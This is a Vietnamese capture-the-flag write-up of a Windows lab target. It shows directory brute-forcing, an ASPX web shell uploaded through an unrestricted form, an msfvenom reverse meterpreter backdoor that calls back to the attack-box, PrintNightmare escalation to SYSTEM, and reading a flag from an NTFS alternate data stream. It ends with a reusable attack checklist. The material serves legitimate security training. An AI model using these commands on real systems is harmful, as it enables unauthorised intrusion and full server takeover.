# win-privesc-printnightmare

- **Category:** Web / Windows PrivEsc
- **File đề:** Đề online, không có file kèm. Mục tiêu: máy `Target8` (IP ví dụ trong PDF `10.0.10.80`) chạy IIS trên cổng 80. Attack-box: một Ubuntu chạy container Kali (IP ví dụ `10.0.10.20`) và một Windows attack-box. *(Chú thích: PDF gốc tham chiếu tên nền tảng/giải và IP mẫu — lược bỏ/giữ ở dạng ví dụ trung tính theo quy tắc.)*

## Tóm tắt đề
Máy mục tiêu chỉ hiển thị **trang IIS mặc định**. Có "tin đồn" máy còn dính một **lỗ hổng Windows cũ**. Nhiệm vụ: chiếm web server và đọc flag (nằm ở `C:\Windows\System32\flag.txt`, nhưng không đọc được do thiếu quyền).

## Phân tích (chi tiết: hằng số/offset/payload/khóa thật)
Chuỗi tấn công gồm 2 giai đoạn rõ rệt:

**Giai đoạn 1 — Foothold qua web (RCE quyền thấp).**
- Trang chủ chỉ là IIS default → không khai thác trực tiếp. Phải **dò đường dẫn ẩn** với các đuôi ASP.NET (`.aspx`, `.asp`) và khác (`.php`, `.html`).
- Tìm ra trang `upload.aspx` — một form upload **không kiểm tra loại file (unrestricted file upload)**.
- Upload **web shell ASPX** → có khả năng chạy lệnh tùy ý ở quyền tiến trình web (user dịch vụ, quyền thấp). Dùng web shell này tìm thấy `flag.txt` tại `C:\Windows\System32` nhưng **không đọc được** nội dung.

**Giai đoạn 2 — Leo thang đặc quyền lên SYSTEM.**
- `systeminfo` cho thấy máy là **Windows Server 2016** chưa vá.
- Gợi ý "old Windows vulnerability" + Server 2016 + đọc file System32 bị chặn → hướng thẳng tới **Print Spooler / PrintNightmare**:
  - **CVE-2021-34527 (PrintNightmare)** — và họ gần là **CVE-2021-1675**.
- Dựng meterpreter reverse shell (msfvenom) rồi dùng `getsystem` / module leo quyền để lên `NT AUTHORITY\SYSTEM`.

**Khóa thật / chi tiết quyết định:** flag được giấu trong một **Alternate Data Stream (ADS)** của NTFS, tên stream là **`flag.txt:flag`**. `dir`/`type` thường **không** thấy stream → phải dùng `dir /r` để lộ, và đọc bằng `more < flag.txt:flag`.

## Kỹ thuật áp dụng (+ VÌ SAO nhận ra)
- **Unrestricted file upload → web shell ASPX (RCE).**
- **Reverse meterpreter** (msfvenom `windows/x64/meterpreter/reverse_tcp` + `multi/handler`).
- **CVE-2021-34527 PrintNightmare** để leo SYSTEM.
- **NTFS ADS** (`flag.txt:flag`) để giấu flag.
- **VÌ SAO nhận ra:**
  - Trang IIS mặc định → phản xạ là **dò thư mục** (`dirb`/`gobuster`).
  - Form upload không lọc đuôi trên runtime ASP.NET → chọn web shell `.aspx`.
  - Đã có shell nhưng không đọc được file ở System32 trên OS cũ → nghĩ tới leo quyền (Spooler/PrintNightmare, hoặc Potato khi có SeImpersonate).
  - File "biến mất" khi `dir`/`type` nhưng kích thước thư mục cho thấy có dữ liệu → kiểm tra `dir /r` phát hiện ADS.

## Lời giải chi tiết (bước + code/lệnh/payload sạch, chạy lại được)
1. **Khởi động Kali container** trên Ubuntu attack-box:
   ```bash
   sudo bash
   docker run -itd -p 4444:4444 --rm kalilinux/kali-rolling
   docker exec -it <CONTAINER_ID> /bin/zsh
   ```

2. **Dò trang ẩn** với nhiều đuôi:
   ```bash
   dirb http://10.0.10.80 -X .htm,.html,.asp,.aspx,.php
   ```
   → tìm thấy `upload.aspx` (upload không giới hạn loại file).

3. **Chuẩn bị web shell ASPX** từ kho `webshells` của Kali:
   ```bash
   apt -y install webshells
   cd /usr/share/webshells/aspx
   python3 -m http.server 4444
   ```
   Lấy file web shell rồi upload lên target qua `upload.aspx`.

4. **Dùng web shell chạy lệnh** → tìm `flag.txt` ở `C:\Windows\System32` (chưa đọc được nội dung).

5. **Sinh backdoor reverse meterpreter** trên Kali:
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.10.20 -f exe -o backdoor.exe
   python3 -m http.server 4444
   ```

6. **Upload `backdoor.exe` lên target**, rồi bật handler:
   ```bash
   msfconsole
   use exploit/multi/handler
   set payload windows/x64/meterpreter/reverse_tcp
   set LHOST 0.0.0.0
   exploit
   ```
   Thực thi `backdoor.exe` qua web shell → có meterpreter session.

7. **Leo quyền SYSTEM** (qua Print Spooler / PrintNightmare):
   ```
   getsystem
   shell
   whoami            # -> nt authority\system
   ```
   Nếu `getsystem` thất bại, dùng module PrintNightmare cụ thể (`exploit/windows/local/cve_2021_1675_printnightmare` hoặc tương đương).

8. **Đọc ADS** (sau khi có SYSTEM, nếu vẫn chặn thì cấp quyền file trước):
   ```
   dir /r               # lộ stream "flag.txt:flag"
   more < flag.txt:flag # đọc nội dung stream
   ```
   (PowerShell: `Get-Content C:\Windows\System32\flag.txt -Stream flag`.)

## Flag
flag{...}

*(Nguồn không nêu: PDF/`SOLUTIONS_VN.md` bài #31 chỉ ghi "flag là ADS `flag.txt:flag`" và chỉ hiện trên server, không in nội dung. Flag thật có wrapper `flag{...}`.)*

## Gặp lại thì xử lý thế nào (playbook)
- **Dấu hiệu nhận diện:**
  - Trang chủ mặc định (IIS/Apache default) → luôn **dò thư mục/trang ẩn** (`dirb`/`gobuster`/`feroxbuster`) với nhiều đuôi.
  - Form upload không lọc đuôi/MIME trên ASP.NET → web shell `.aspx`.
  - Đã có shell nhưng không đọc được file System32 trên OS cũ (2016/2019 chưa vá) → leo quyền Spooler (PrintNightmare) hoặc Potato (JuicyPotato/PrintSpoofer khi có SeImpersonate).
  - File "biến mất" khi `dir`/`type` → `dir /r` lộ **ADS**; đọc bằng `more < file:stream` hoặc `Get-Content file -Stream stream`.
- **Quy trình:** recon (nmap/dirb) → upload shell → reverse meterpreter → `getsystem`/exploit leo quyền → đọc flag (chú ý ADS).
- **Bẫy:** sai LHOST; web shell bị AV/AppLocker chặn; `getsystem` fail → dùng exploit Spooler cụ thể; đọc nhầm `flag.txt` thường thay vì stream `:flag`.
- **Checklist:** [ ] dò path ẩn [ ] tìm upload [ ] web shell RCE [ ] reverse meterpreter [ ] xác định OS/bản vá [ ] leo SYSTEM [ ] `dir /r` tìm ADS [ ] `more <` đọc stream.
